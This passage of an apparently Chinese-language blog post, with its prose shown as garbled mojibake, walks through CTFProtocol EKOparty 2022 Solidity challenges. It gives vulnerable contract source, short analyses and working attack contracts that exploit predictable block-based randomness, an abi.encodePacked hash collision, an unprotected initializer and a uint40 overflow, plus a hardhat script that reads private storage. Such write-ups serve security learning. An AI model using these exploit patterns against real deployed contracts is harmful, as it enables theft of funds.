keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(slot, &quot;KittyCat!&quot;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function areYouHidingHere(bytes32 slot) external view returns (bool) &#123;</span><br><span class="line">        require(msg.sender == _owner, &quot;!owner&quot;);</span><br><span class="line">        bytes32 kittyPointer;</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            kittyPointer := sload(slot)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return kittyPointer == &quot;KittyCat!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function destroyMe() external &#123;</span><br><span class="line">        require(msg.sender == _owner, &quot;!owner&quot;);</span><br><span class="line">        selfdestruct(payable(address(0)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract House &#123;</span><br><span class="line">    bool public catFound;</span><br><span class="line"></span><br><span class="line">    function isKittyCatHere(bytes32 _slot) external &#123;</span><br><span class="line">        if (catFound) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        HiddenKittyCat hiddenKittyCat = new HiddenKittyCat();</span><br><span class="line">        bool found = hiddenKittyCat.areYouHidingHere(_slot);</span><br><span class="line"></span><br><span class="line">        if (!found) &#123;</span><br><span class="line">            hiddenKittyCat.destroyMe();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            catFound = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-analysis"><a href="#2-analysis" class="headerlink" title="2. analysis"></a>2. analysis</h4><blockquote>
<p>ä¸€çœ‹åˆ°è¿™ä¸ª<code>bytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));</code>ç»å…¸è€é—®é¢˜äº†ï¼Œbadnonceå•¦ï¼Œåœ¨ç‰¹å®šæ¡ä»¶ä¸‹å¯æ§ï¼Œè¯¥ä»£ç å†™åœ¨æ„é€ å™¨ä¸­ï¼Œä½†æ˜¯éƒ¨ç½²æ“ä½œåœ¨Houseåˆçº¦çš„<code>isKittyCatHere()</code>ä¸­ï¼Œæ‰€ä»¥slotæ˜¯å¯æ§çš„ã€‚</p>
</blockquote>
<h4 id="3-solve"><a href="#3-solve" class="headerlink" title="3. solve"></a>3. solve</h4><p><strong>æ”»å‡»åˆçº¦</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract KittyHacker &#123;</span><br><span class="line"></span><br><span class="line">    House house;</span><br><span class="line"></span><br><span class="line">    constructor(address _house) &#123;</span><br><span class="line">        house = House(_house);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line"></span><br><span class="line">        // compute the value of slot in advance</span><br><span class="line">        bytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));</span><br><span class="line">        house.isKittyCatHere(slot);</span><br><span class="line">        require(house.catFound(), &quot;Kitty is not be found...&quot;);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/01/Smart%20contracts/CTFProtocol/CTFProtocol/image-20230902163320798.png" alt="image-20230902163320798"></p>
<p><em>æ³¨æ„ï¼šå¦‚æœè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ç¡®ä¿ä½ çš„åŒºå—é«˜åº¦å¤§äº69ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚ã€‚ã€‚</em></p>
<h3 id="RootMe"><a href="#RootMe" class="headerlink" title="RootMe"></a>RootMe</h3><h4 id="1-question-1"><a href="#1-question-1" class="headerlink" title="1.question"></a>1.question</h4><blockquote>
<p>Can you trick the machine to get root access?</p>
</blockquote>
<p><strong>æºç </strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">/// @title RootMe</span><br><span class="line">/// @author https://twitter.com/tinchoabbate</span><br><span class="line">/// @notice Anon, can you trick the machine to get root access?</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/rootme</span><br><span class="line">contract RootMe &#123;</span><br><span class="line">    bool public victory;</span><br><span class="line"></span><br><span class="line">    mapping(string =&gt; bool) public usernames;</span><br><span class="line">    mapping(bytes32 =&gt; address) public accountByIdentifier;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        register(&quot;ROOT&quot;, &quot;ROOT&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyRoot() &#123;</span><br><span class="line">        require(accountByIdentifier[_getIdentifier(&quot;ROOT&quot;, &quot;ROOT&quot;)] == msg.sender, &quot;Not authorized&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function register(string memory username, string memory salt) public &#123;</span><br><span class="line">        require(usernames[username] == false, &quot;Username already exists&quot;);</span><br><span class="line"></span><br><span class="line">        usernames[username] = true;</span><br><span class="line"></span><br><span class="line">        bytes32 identifier = _getIdentifier(username, salt);</span><br><span class="line">        accountByIdentifier[identifier] = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _getIdentifier(string memory user, string memory salt) private pure returns (bytes32) &#123;</span><br><span class="line">        return keccak256(abi.encodePacked(user, salt));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @notice Allows root account to perform any change in the contract&#x27;s storage</span><br><span class="line">     * @param storageSlot storage position where data will be written</span><br><span class="line">     * @param data data to be written</span><br><span class="line">     */</span><br><span class="line">    function write(bytes32 storageSlot, bytes32 data) external onlyRoot &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            // stores `data` in storage at position `storageSlot`</span><br><span class="line">            sstore(storageSlot, data)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-analysis-1"><a href="#2-analysis-1" class="headerlink" title="2. analysis"></a>2. analysis</h4><blockquote>
<p><em>æ¼æ´æ‰€åœ¨ï¼š</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function _getIdentifier(string memory user, string memory salt) private pure returns (bytes32) &#123;</span><br><span class="line">    return keccak256(abi.encodePacked(user, salt));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>abi.encodePacked(user, salt)</code>ï¼Œè¯¥æ‰“åŒ…æ–¹å¼ï¼Œçœç•¥äº†å˜é‡çš„å­˜å‚¨ä½ç½®ï¼Œå˜é‡å€¼çš„é•¿åº¦ï¼Œåªæœ‰å˜é‡çœŸæ­£çš„æ•°æ®éƒ¨åˆ†ï¼Œè€Œä¸”è¿˜å°†è¿™ä¸¤ä¸ªå€¼æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œå¯¼è‡´<em>abi.encodePacked(â€œROOTâ€, â€œROOTâ€)å’Œabi.encodePacked(â€œROOâ€, â€œTROOTâ€)çš„å€¼æ˜¯ä¸€æ ·çš„ã€‚</em></p>
</blockquote>
<h4 id="3-solve-1"><a href="#3-solve-1" class="headerlink" title="3. solve"></a>3. solve</h4><p><strong>æ”»å‡»åˆçº¦</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract RootMeHacker &#123;</span><br><span class="line"></span><br><span class="line">    RootMe rm;</span><br><span class="line"></span><br><span class="line">    constructor (address _rm) &#123;</span><br><span class="line">        rm = RootMe(_rm);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        rm.register(&quot;ROO&quot;, &quot;TROOT&quot;); // hacker æˆä¸º ROOT</span><br><span class="line">        rm.write(bytes32(uint(0)), bytes32(uint(1))); // å°†å˜é‡victoryæ”¹æˆtrue</span><br><span class="line">        require(rm.victory() == true, &quot;you are not victory..&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/01/Smart%20contracts/CTFProtocol/CTFProtocol/image-20230902160419855.png" alt="image-20230902160419855"></p>
<h3 id="Trickster"><a href="#Trickster" class="headerlink" title="Trickster"></a>Trickster</h3><h4 id="1-question-2"><a href="#1-question-2" class="headerlink" title="1.question"></a>1.question</h4><blockquote>
<p>We might have spotted a honeypotâ€¦ Can you manage to obtain the real jackpot?.<br>Hacking casino slot machines is considered illegal.</p>
</blockquote>
<p><strong>æºç </strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">/// @title Trickster</span><br><span class="line">/// @author https://twitter.com/mattaereal</span><br><span class="line">/// @notice We might have spotted a honeypot... Anon, can you manage to obtain the real jackpot?</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/trickster</span><br><span class="line">contract Jackpot &#123;</span><br><span class="line">    address private jackpotProxy;</span><br><span class="line">    address private owner;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initialize(address _jackpotProxy) public payable &#123;</span><br><span class="line">        jackpotProxy = _jackpotProxy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyJackpotProxy() &#123;</span><br><span class="line">        require(msg.sender == jackpotProxy);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimPrize(uint256 amount) external payable onlyJackpotProxy &#123;</span><br><span class="line">        payable(msg.sender).transfer(amount * 2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract JackpotProxy &#123;</span><br><span class="line">    address private owner;</span><br><span class="line">    address private jackpot;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        address _proxy = address(new Jackpot());</span><br><span class="line">        initialize(_proxy);</span><br><span class="line">        payable(_proxy).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initialize(address _jackpot) public onlyOwner &#123;</span><br><span class="line">        jackpot = _jackpot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimPrize() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;zero deposit&quot;);</span><br><span class="line">        (bool success,) = jackpot.call&#123;value: msg.value&#125;(abi.encodeWithSignature(&quot;claimPrize(uint)&quot;, msg.value));</span><br><span class="line">        require(success, &quot;failed&quot;);</span><br><span class="line">        payable(msg.sender).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balance() external view returns (uint256) &#123;</span><br><span class="line">        return jackpot.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="2-analysis-2"><a href="#2-analysis-2" class="headerlink" title="2. analysis"></a>2. analysis</h4><blockquote>
<p>ä½•ä¸ºèœœç½ï¼Œåé’±ï¼Œéª—å±€ï¼Œ<code>JackpotProxy</code>ä¸­çš„<code>claimPrize()</code>å°±æ˜¯ä¸€ä¸ªéª—å±€ï¼Œä»”ç»†çœ‹ã€‚</p>
<p><em>æˆåŠŸè°ƒç”¨<code>JackPotä¸­çš„claimPrize()å‡½æ•°</code>ï¼Œè¯¥åˆçº¦ä¸­çš„<code>initialize()</code>ä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨ï¼Œæ‰€ä»¥ä»»ä½•äººéƒ½å¯ä»¥æˆä¸º<code>jackpotProxy</code>ï¼Œä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨<code>claimPrize</code>å‡½æ•°ï¼Œé—®é¢˜è½¬ä¸ºè·å–<code>address private jackpot</code>ï¼Œåœ¨åŒºå—é“¾ä¸­æ•°æ®éƒ½æ˜¯å…¬å¼€é€æ˜çš„ï¼Œå¯ä»¥é‡‡ç”¨hardhatæ¥å¸®åŠ©è¯»å–è¯¥å€¼ã€‚</em></p>
</blockquote>
<h4 id="3-solve-2"><a href="#3-solve-2" class="headerlink" title="3. solve"></a>3. solve</h4><p><strong>æ”»å‡»åˆçº¦</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">contract JackPotHacker &#123;</span><br><span class="line"></span><br><span class="line">    Jackpot jackpot;</span><br><span class="line">    JackpotProxy jackpotProxy;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _jackpot, address payable _jackpotProxy) &#123;</span><br><span class="line">        jackpot = Jackpot(_jackpot);</span><br><span class="line">        jackpotProxy = JackpotProxy(_jackpotProxy);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        jackpot.initialize(address(this)); </span><br><span class="line">        uint half_balance = jackpotProxy.balance() / 2;</span><br><span class="line">        jackpot.claimPrize(half_balance);</span><br><span class="line">        require(jackpotProxy.balance() == 0, &quot;&quot;);</span><br><span class="line">        returnMoney();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function returnMoney() internal &#123;</span><br><span class="line">        payable(owner).call&#123;value: address(this).balance&#125;(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ä½¿ç”¨hardhat</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&#x27;hardhat&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;[CTFProtocol-2022] Trickster&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> deployer, player;</span><br><span class="line">    <span class="keyword">let</span> jackpotproxy, jackpot;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">before</span>(<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        [deployer, player] = <span class="keyword">await</span> ethers.<span class="title function_">getSigners</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// deploy the contract with 2 wei</span></span><br><span class="line">        <span class="keyword">let</span> contract_factory = <span class="keyword">await</span> (<span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;JackpotProxy&#x27;</span>)).<span class="title function_">deploy</span>(&#123;<span class="attr">value</span>: <span class="number">2</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`jackpotproxy = <span class="subst">$&#123;jackpotproxy = contract_factory.target&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// get private&#x27;value =&gt; jackpot</span></span><br><span class="line">        <span class="keyword">let</span> slot1 = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getStorage</span>(contract_factory.<span class="property">target</span>, <span class="number">1</span>);</span><br><span class="line">        jackpot = slot1 = <span class="string">`0x<span class="subst">$&#123;slot1.slice(slot1.length-<span class="number">40</span>, slot1.length)&#125;</span>`</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`jackpot = <span class="subst">$&#123;jackpot&#125;</span> `</span>);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">it</span>(<span class="string">&quot;Execution&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> hacker = <span class="keyword">await</span> (<span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;JackPotHacker&#x27;</span>)).<span class="title function_">deploy</span>(jackpot, jackpotproxy);</span><br><span class="line">        <span class="keyword">await</span> hacker.<span class="title function_">attack</span>();</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">after</span>(<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/01/Smart%20contracts/CTFProtocol/CTFProtocol/image-20230902205858130.png" alt="image-20230902205858130"></p>
<h3 id="The-Golden-Ticket"><a href="#The-Golden-Ticket" class="headerlink" title="The Golden Ticket"></a>The Golden Ticket</h3><h4 id="1-question-3"><a href="#1-question-3" class="headerlink" title="1.question"></a>1.question</h4><blockquote>
<p>The organizers of Ekoparty decided that the tickets for the 2023 conference would be purchased through a smart contract. However, the conference is oversold and you have to sign up for a waitlist to get your ticket. The problem is that they put you on hold for ten years and the only option you have is to extend the wait. After the wait is over, you have to enter a raffle to see if you get the ticket</p>
</blockquote>
<p><strong>æºç </strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">/// @title The Golden Ticket</span><br><span class="line">/// @author https://twitter.com/AlanRacciatti</span><br><span class="line">/// @notice Mint your ticket to the EKOparty, if you are patient and lucky enough.</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/the-golden-ticket</span><br><span class="line">contract GoldenTicket &#123;</span><br><span class="line">    mapping(address =&gt; uint40) public waitlist;</span><br><span class="line">    mapping(address =&gt; bool) public hasTicket;</span><br><span class="line"></span><br><span class="line">    function joinWaitlist() external &#123;</span><br><span class="line">        require(waitlist[msg.sender] == 0, &quot;Already on waitlist&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            ///@dev 10 years wait list</span><br><span class="line">            waitlist[msg.sender] = uint40(block.timestamp + 10 * 365 days);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function updateWaitTime(uint256 _time) external &#123;</span><br><span class="line">        require(waitlist[msg.sender] != 0, &quot;Join waitlist first&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            waitlist[msg.sender] += uint40(_time);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function joinRaffle(uint256 _guess) external &#123;</span><br><span class="line">        require(waitlist[msg.sender] != 0, &quot;Not in waitlist&quot;);</span><br><span class="line">        require(waitlist[msg.sender] &lt;= block.timestamp, &quot;Still have to wait&quot;);</span><br><span class="line">        require(!hasTicket[msg.sender], &quot;Already have a ticket&quot;);</span><br><span class="line">        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));</span><br><span class="line">        if (randomNumber == _guess) &#123;</span><br><span class="line">            hasTicket[msg.sender] = true;</span><br><span class="line">        &#125;</span><br><span class="line">        delete waitlist[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function giftTicket(address _to) external &#123;</span><br><span class="line">        require(hasTicket[msg.sender], &quot;Yoy dont own a ticket&quot;);</span><br><span class="line">        hasTicket[msg.sender] = false;</span><br><span class="line">        hasTicket[_to] = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-analysis-3"><a href="#2-analysis-3" class="headerlink" title="2. analysis"></a>2. analysis</h4><blockquote>
<p>æœ¬é¢˜æ¼æ´ï¼šåéšæœºæ•°ï¼Œæ•´æ•°æº¢å‡º</p>
<p>å³ä½¿åœ¨ <code>^0.8.0</code>çš„ç¼–è¯‘å™¨ä¸­ï¼Œä½¿ç”¨äº†<code>unchecked&#123;&#125;</code>å…³é”®å­—ï¼Œå³æ”¾å¼ƒäº†æ•´æ•°æº¢å‡ºçš„æ£€æµ‹ï¼Œè¿™ä¾¿æœ‰äº†æº¢å‡ºçš„é£é™©ï¼Œ</p>
<p>è€Œ<code>updateWaitTime(uint256 _time)</code>å‡½æ•°å°±æ˜¯å¯¼è‡´æ•´æ•°æº¢å‡ºçš„å…³é”®å‡½æ•°ï¼Œåªè¦ç¨åŠ è®¡ç®—ä¾¿å¯ä»¥ç®—å‡ºæº¢å‡ºæ¡ä»¶ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæº¢å‡ºçš„ç»“æœä¸èƒ½ä¸º0ï¼Œå¯ä»¥æ˜¯[1, block.timestamp]ä¹‹é—´çš„ä»»ä½•æ•°ã€‚</p>
<p>è‡³äºåéšæœºæ•°ï¼Œå¯åœ¨åŒä¸€ä¸ªå‡½æ•°ä¸­æå‰è®¡ç®—ã€‚</p>
</blockquote>
<h4 id="3-solve-3"><a href="#3-solve-3" class="headerlink" title="3. solve"></a>3. solve</h4><p><strong>æ”»å‡»åˆçº¦</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">contract GoldenTicketHacker &#123;</span><br><span class="line"></span><br><span class="line">    GoldenTicket goldenticket;</span><br><span class="line"></span><br><span class="line">    constructor(address _goldenticket) &#123;</span><br><span class="line">        goldenticket = GoldenTicket(_goldenticket);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        goldenticket.joinWaitlist();</span><br><span class="line">        goldenticket.updateWaitTime(calFlow());</span><br><span class="line">        uint256 guess = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));</span><br><span class="line">        goldenticket.joinRaffle(guess);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function calFlow() internal view returns(uint256) &#123;</span><br><span class="line">        uint max_uint40 = type(uint40).max;</span><br><span class="line">        uint40 wait_time = uint40(block.timestamp + 10 * 365 days);</span><br><span class="line">        uint res = uint40(max_uint40 - wait_time);</span><br><span class="line">        return res + 2; // å®ç°ä¸Šæº¢,ä½¿å¾—waitlist[msg.sender] = 1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/01/Smart%20contracts/CTFProtocol/CTFProtocol/image-20230903115338408.png" alt="image-20230903115338408"></p>
